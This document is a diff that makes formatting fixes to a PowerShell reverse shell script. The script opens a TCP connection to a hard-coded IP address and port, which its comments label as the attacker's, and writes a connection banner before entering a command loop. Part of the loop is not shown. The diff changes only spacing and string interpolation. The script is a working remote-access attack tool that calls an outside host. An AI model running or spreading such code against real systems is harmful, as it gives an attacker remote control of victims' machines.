@@ -1,13 +1,13 @@
 $ip = "147.185.221.20" # Change this to the attacker's IP address
-$port = 10626        # Change this to the attacker's listening port
+$port = 10626         # Change this to the attacker's listening port
 
-$client = New-Object System.Net.Sockets.TCPClient($ip,$port)
+$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
 $stream = $client.GetStream()
 $writer = New-Object System.IO.StreamWriter($stream)
 $buffer = New-Object System.Byte[] 1024
 $encoding = New-Object System.Text.ASCIIEncoding
 
-$writer.Write("[*] Connected to $ip:$port")
+$writer.Write("[*] Connected to ${ip}:${port}")
 $writer.Flush()
 
 while ($true) {
@@ -29,3 +29,4 @@ while ($true) {
 $writer.Close()
 $stream.Close()
 $client.Close()
+
